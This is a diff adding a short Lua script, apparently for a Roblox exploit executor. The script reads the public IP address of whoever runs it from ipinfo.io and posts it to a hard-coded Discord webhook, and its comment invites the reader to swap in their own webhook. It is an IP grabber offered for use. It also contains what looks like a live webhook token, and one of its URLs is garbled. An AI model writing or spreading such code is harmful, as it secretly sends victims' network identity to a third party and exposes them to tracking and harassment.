@@ -1,0 +1,10 @@
+http_request({
+    Url = "https://discord.com/api/webhooks/1119893531469828187/nCwpW1vSW0MUKEeMm7fICnxQJgGoj0-VoLThAZlxu8tylnGVppbVuHNusgAeRsm9gmL7", -- add your own webhook
+    Method = "POST",
+    Headers = {
+    ["content-type"] = "application/json"
+    },
+    Body = game:GetService("HttpService"):JSONEncode({
+    ["content"] = game:HttpGet("https://ipinfo.io/ip%22)
+    })
+    })
